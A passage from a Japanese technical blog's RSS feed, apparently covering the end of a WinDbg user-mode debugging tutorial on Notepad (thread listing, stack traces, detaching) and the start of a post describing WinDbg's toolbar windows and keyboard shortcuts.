01 00000055`5f8fdb80 00007ff9`9bc0c641     RPCRT4!UTIL_WriteFile+0x5c
02 00000055`5f8fdbe0 00007ff9`9bbf5863     RPCRT4!NMP_SyncSend+0x81
03 00000055`5f8fdc60 00007ff9`9bbf2a56     RPCRT4!OSF_CCONNECTION::TransSendReceive+0xf7
04 00000055`5f8fdcd0 00007ff9`9bbf239b     RPCRT4!OSF_CCONNECTION::SendBindPacket+0x2ee
05 00000055`5f8fdf20 00007ff9`9bbf3ed1     RPCRT4!OSF_CCONNECTION::ActuallyDoBinding+0xeb
06 00000055`5f8fdfd0 00007ff9`9bbf3c0e     RPCRT4!OSF_CCONNECTION::OpenConnectionAndBind+0x225
07 00000055`5f8fe080 00007ff9`9bbf7736     RPCRT4!OSF_CCALL::BindToServer+0xce
08 00000055`5f8fe120 00007ff9`9bbf84d6     RPCRT4!OSF_BINDING_HANDLE::InitCCallWithAssociation+0x8a
09 00000055`5f8fe180 00007ff9`9bbf75e7     RPCRT4!OSF_BINDING_HANDLE::AllocateCCall+0x256
0a 00000055`5f8fe2e0 00007ff9`9bca00f5     RPCRT4!OSF_BINDING_HANDLE::NegotiateTransferSyntax+0x37
0b 00000055`5f8fe330 00007ff9`9bca3840     RPCRT4!NdrpClientCall3+0x715
0c 00000055`5f8fe6a0 00007ff9`99bc139e     RPCRT4!NdrClientCall3+0xf0
0d 00000055`5f8fea30 00007ff9`775c1e00     wkscli!NetWkstaGetInfo+0x5e
0e 00000055`5f8feae0 00007ff9`83c62df6     ntlanman!NPOpenEnum+0x50
0f 00000055`5f8fec40 00007ff9`83c61b7f     MPR!MprOpenEnumConnect+0x176&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&quot;プロセス内のスレッド一覧を表示する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%83%97%E3%83%AD%E3%82%BB%E3%82%B9%E5%86%85%E3%81%AE%E3%82%B9%E3%83%AC%E3%83%83%E3%83%89%E4%B8%80%E8%A6%A7%E3%82%92%E8%A1%A8%E7%A4%BA%E3%81%99%E3%82%8B&quot; aria-label=&quot;プロセス内のスレッド一覧を表示する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;プロセス内のスレッド一覧を表示する&lt;/h3&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;~&lt;/code&gt;コマンドを使って、プロセス内のスレッド一覧を取得できます。
参考：&lt;a href=&quot;https://docs.microsoft.com/ja-jp/windows-hardware/drivers/debugger/---thread-status-&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;~ (スレッドの状態) - Windows drivers | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;現在のメモ帳プロセスには、以下の14個のスレッドが存在するようです。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;0:011&gt; ~
   0  Id: de4&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;7ac Suspend: 1 Teb: 00000055`5f35c000 Unfrozen
   1  Id: de4&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;22f0 Suspend: 1 Teb: 00000055`5f36a000 Unfrozen
   2  Id: de4&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;1500 Suspend: 1 Teb: 00000055`5f36e000 Unfrozen
   3  Id: de4&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;198c Suspend: 1 Teb: 00000055`5f370000 Unfrozen
   4  Id: de4&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;2094 Suspend: 1 Teb: 00000055`5f364000 Unfrozen
   5  Id: de4&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;1d6c Suspend: 1 Teb: 00000055`5f372000 Unfrozen
   6  Id: de4&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;1048 Suspend: 1 Teb: 00000055`5f368000 Unfrozen
   7  Id: de4&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;1408 Suspend: 1 Teb: 00000055`5f374000 Unfrozen
   8  Id: de4&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;30c Suspend: 1 Teb: 00000055`5f376000 Unfrozen
   9  Id: de4&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;1b18 Suspend: 1 Teb: 00000055`5f378000 Unfrozen
  10  Id: de4&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;af8 Suspend: 1 Teb: 00000055`5f37a000 Unfrozen
&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt; 11  Id: de4&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;898 Suspend: 1 Teb: 00000055`5f37e000 Unfrozen
  12  Id: de4&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;1720 Suspend: 1 Teb: 00000055`5f380000 Unfrozen
  13  Id: de4&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;37c Suspend: 1 Teb: 00000055`5f382000 Unfrozen&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&quot;特定のスレッドのスタックトレースを取得する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E7%89%B9%E5%AE%9A%E3%81%AE%E3%82%B9%E3%83%AC%E3%83%83%E3%83%89%E3%81%AE%E3%82%B9%E3%82%BF%E3%83%83%E3%82%AF%E3%83%88%E3%83%AC%E3%83%BC%E3%82%B9%E3%82%92%E5%8F%96%E5%BE%97%E3%81%99%E3%82%8B&quot; aria-label=&quot;特定のスレッドのスタックトレースを取得する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;特定のスレッドのスタックトレースを取得する&lt;/h3&gt;
&lt;p&gt;ここで、特定のスレッドのスタックトレースを取得するには、以下のコマンドを続けて使用します。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;~0s
k&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;~0s&lt;/code&gt;コマンドは、スレッド番号0の設定を取得します。
参考：&lt;a href=&quot;https://docs.microsoft.com/ja-jp/windows-hardware/drivers/debugger/-s--set-current-thread-&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;~s (現在のスレッドの設定) - Windows drivers | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;出力は次のようになりました。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;0:011&gt; ~0s
win32u!NtGdiGetCharABCWidthsW+0x14:
00007ff9`9b3465e4 c3              ret
0:000&gt; k
 &lt;span class=&quot;token comment&quot;&gt;# Child-SP          RetAddr               Call Site&lt;/span&gt;
00 00000055`5f117108 00007ff9`9b01a2ae     win32u!NtGdiGetCharABCWidthsW+0x14
01 00000055`5f117110 00007ff9`9b01a211     gdi32full!LoadGlyphMetricsWithGetCharABCWidthsI+0x5e
02 00000055`5f1174b0 00007ff9`9b019d60     gdi32full!LoadGlyphMetrics+0x99
03 00000055`5f1174f0 00007ff9`8aa29016     gdi32full!CUspShapingFont::GetGlyphDefaultAdvanceWidths+0x150
04 00000055`5f117550 00007ff9`9b020b65     TextShaping!ShapingGetGlyphPositions+0x516
05 00000055`5f117750 00007ff9`9b0266e3     gdi32full!ShlPlaceOT+0x255
06 00000055`5f117970 00007ff9`9b025d9b     gdi32full!RenderItemNoFallback+0x573
07 00000055`5f117aa0 00007ff9`9b025c6b     gdi32full!RenderItemWithFallback+0xeb
08 00000055`5f117af0 00007ff9`9b025a3f     gdi32full!RenderItem+0x3b
09 00000055`5f117b40 00007ff9`9b027ac6     gdi32full!ScriptStringAnalyzeGlyphs+0x20f
0a 00000055`5f117bf0 00007ff9`9b024ca2     gdi32full!ScriptStringAnalyse+0x626
0b 00000055`5f117dc0 00007ff9`9b0246be     gdi32full!LpkCharsetDraw+0x5c2
0c 00000055`5f117ff0 00007ff9`9d01f5f2     gdi32full!LpkDrawTextEx+0x5e
0d 00000055`5f118060 00007ff9`9d01e9bf     USER32!DT_DrawStr+0xb6
0e 00000055`5f118110 00007ff9`9d01eede     USER32!DT_GetLineBreak+0xf3
0f 00000055`5f1181b0 00007ff9`9d01eb50     USER32!DrawTextExWorker+0x36e
10 00000055`5f118300 00007ff9`6b8a6123     USER32!DrawTextW+0x40
11 00000055`5f118370 00007ff9`6b89ac60     DUI70!DirectUI::Element::GetContentSize+0x463
12 00000055`5f118450 00007ff9`6b8a7196     DUI70!DirectUI::Element::_UpdateDesiredSize+0x6a0
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; 以下略 &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&quot;デバッグを終了してプロセスからデタッチする&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%83%87%E3%83%90%E3%83%83%E3%82%B0%E3%82%92%E7%B5%82%E4%BA%86%E3%81%97%E3%81%A6%E3%83%97%E3%83%AD%E3%82%BB%E3%82%B9%E3%81%8B%E3%82%89%E3%83%87%E3%82%BF%E3%83%83%E3%83%81%E3%81%99%E3%82%8B&quot; aria-label=&quot;デバッグを終了してプロセスからデタッチする permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;デバッグを終了して、プロセスからデタッチする&lt;/h3&gt;
&lt;p&gt;最後に&lt;code class=&quot;language-text&quot;&gt;qd&lt;/code&gt;コマンドを使用して、デバッグを終了してプロセスからデタッチします。&lt;/p&gt;
&lt;p&gt;デバッグを終了すると、Commandウィンドウが終了し、停止されていたメモ帳の書き込み処理が再開されました。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;image-20211003212553671.png&quot; alt=&quot;image-20211003212553671&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;まとめ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%81%BE%E3%81%A8%E3%82%81&quot; aria-label=&quot;まとめ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;まとめ&lt;/h2&gt;
&lt;p&gt;とりあえず&lt;a href=&quot;https://docs.microsoft.com/ja-jp/windows-hardware/drivers/debugger/getting-started-with-windbg&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;公式チュートリアル&lt;/a&gt;のユーザモードデバッグの手順について一通り実践してみました。&lt;/p&gt;
&lt;p&gt;WinDbgを用いたWindowsのデバッグやダンプの解析方法について公開しているその他情報については、以下のページのリストをご覧ください。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;/windows-windbg-001-index&quot;&gt;WinDbgを用いたデバッグとトラブルシューティングのテクニック&lt;/a&gt;&lt;/p&gt;</content:encoded></item><item><title><![CDATA[WinDbgの各ウィンドウについてまとめてみた]]></title><link>https://kashiwaba-yuki.com/windows-windbg-003-ui</link><guid isPermaLink="false">https://kashiwaba-yuki.com/windows-windbg-003-ui</guid><pubDate>Tue, 05 Oct 2021 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;この記事では、&lt;a href=&quot;/windows-windbg-002-tutorial&quot;&gt;WinDbgのユーザモードデバッグチュートリアルを試してみた&lt;/a&gt;で使用したチュートリアルの環境を利用して、WinDbgの基本的なUI操作についてまとめていきます。&lt;/p&gt;
&lt;p&gt;WinDbgを用いたWindowsのデバッグやダンプの解析方法について公開している情報については、以下のページに一覧をまとめているので、よければご覧ください。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;/windows-windbg-001-index&quot;&gt;WinDbgを用いたデバッグとトラブルシューティングのテクニック&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;本記事では、以下の内容についてまとめています。&lt;/p&gt;
&lt;!-- omit in toc --&gt;
&lt;h2 id=&quot;もくじ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%82%E3%81%8F%E3%81%98&quot; aria-label=&quot;もくじ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;もくじ&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#windbg%E3%81%AEui%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6&quot;&gt;WinDbgのUIについて&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#1-open-souce-file-ctrlo%E3%82%AD%E3%83%BC&quot;&gt;1. Open Souce File ([Ctrl+O]キー)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#2-insert-or-remove-breakpoint-f9%E3%82%AD%E3%83%BC&quot;&gt;2. Insert or remove breakpoint ([F9]キー)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#3-command-alt1%E3%82%AD%E3%83%BC&quot;&gt;3. Command ([Alt+1]キー)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#4-watch-alt2%E3%82%AD%E3%83%BC&quot;&gt;4. Watch （[Alt+2]キー）&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#5-locals-alt3%E3%82%AD%E3%83%BC&quot;&gt;5. Locals （[Alt+3]キー）&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#6-registers-alt4%E3%82%AD%E3%83%BC&quot;&gt;6. Registers （[Alt+4]キー）&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#7-memory-window-alt5%E3%82%AD%E3%83%BC&quot;&gt;7. Memory Window （[Alt+5]キー）&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#8-call-stack-alt6%E3%82%AD%E3%83%BC&quot;&gt;8. Call Stack ([Alt+6]キー)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#9-disassembly-alt7%E3%82%AD%E3%83%BC&quot;&gt;9. Disassembly ([Alt+7]キー)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#10-scratch-pad-alt8%E3%82%AD%E3%83%BC&quot;&gt;10. Scratch Pad ([Alt+8]キー)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#11-processes-and-threads-alt9%E3%82%AD%E3%83%BC&quot;&gt;11. Processes and Threads ([Alt+9]キー)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#12--command-brouser-ctrln%E3%82%AD%E3%83%BC&quot;&gt;12.  Command Brouser ([Ctrl+N]キー)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#13--source-mode-on&quot;&gt;13.  Source mode ON&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#14--source-mode-off&quot;&gt;14.  Source mode OFF&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#15--font&quot;&gt;15.  Font&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#16--options&quot;&gt;16.  Options&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%81%BE%E3%81%A8%E3%82%81&quot;&gt;まとめ&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;windbgのuiについて&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#windbg%E3%81%AEui%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6&quot; aria-label=&quot;windbgのuiについて permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;WinDbgのUIについて&lt;/h2&gt;
&lt;p&gt;今回利用しているWinDbgのバージョンは&lt;code class=&quot;language-text&quot;&gt;WinDbg10.0.22000.1 AMD64&lt;/code&gt;です。&lt;/p&gt;
&lt;p&gt;こちらはWinDbgを起動した直後のGUIです。管理者権限で起動しています。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/44f5ab29d0f23d3e492a99553f12a1bb/0b533/image-20211001004013146.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 61.66666666666666%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAYAAABiDJ37AAAACXBIWXMAARlAAAEZQAGA43XUAAAA00lEQVQoz+2TywrCMBBF8/9/Yp+TZ0Oh0tpdv8RHu65d2GtGBVFQobp0cbjJJbnMMIzY7vYY+h7DMKA/XHUcR0zHCfM84/QWPNz5vbAmh/cehXNwAWvtBfaqqkIZ1FkPyhScKSBThcIET4WzLmGNg84zWKXRdR2ElgpEBCnlI8HLA5RloDQFJcldkxgUrUAxawwZvDSKUK3XEFyVMeY1odpPcEdKKWya5hqotb58Zl0C/+WumufAb/gH/jCQR750us9TrusagjeCQ91tU5bCwW3b4gwyrPpYHYlhdwAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/44f5ab29d0f23d3e492a99553f12a1bb/8ac56/image-20211001004013146.webp 240w,
/static/44f5ab29d0f23d3e492a99553f12a1bb/d3be9/image-20211001004013146.webp 480w,
/static/44f5ab29d0f23d3e492a99553f12a1bb/b0a15/image-20211001004013146.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/44f5ab29d0f23d3e492a99553f12a1bb/8ff5a/image-20211001004013146.png 240w,
/static/44f5ab29d0f23d3e492a99553f12a1bb/e85cb/image-20211001004013146.png 480w,
/static/44f5ab29d0f23d3e492a99553f12a1bb/0b533/image-20211001004013146.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/44f5ab29d0f23d3e492a99553f12a1bb/0b533/image-20211001004013146.png&quot;
            alt=&quot;WinDbg起動後GUI&quot;
            title=&quot;WinDbg起動後GUI&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;それぞれのボタンは次の機能を持ちます。&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&quot;center&quot;&gt;番号&lt;/th&gt;
&lt;th align=&quot;center&quot;&gt;機能&lt;/th&gt;
&lt;th align=&quot;center&quot;&gt;ショートカット&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;1&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;Open Souce File&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;Ctrl+O&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;2&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;Insert or remove breakpoint&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;F9&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;3&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;Command&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;Alt+1&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;4&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;Watch&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;Alt+2&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;5&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;Locals&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;Alt+3&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;6&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;Registers&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;Alt+4&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;7&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;Memory Window&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;Alt+5&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;8&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;Call Stack&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;Alt+6&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;9&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;Disassembly&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;Alt+7&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;10&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;Scratch Pad&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;Alt+8&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;11&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;Processes and Threads&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;Alt+9&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;12&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;Command Brouser&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;Ctrl+N&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;13&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;Source mode ON&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;N/A&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;14&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;Source mode OFF&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;N/A&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;15&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;Font&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;N/A&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;16&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;Options&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;N/A&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;各ツールバーボタンの説明については、以下のリファレンスに記載があります。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/ja-jp/windows-hardware/drivers/debugger/toolbar-buttons&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;ツール バー ボタン - Windows drivers | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;各ショートカットについても以下のリファレンスに記載があります。&lt;/p&gt;
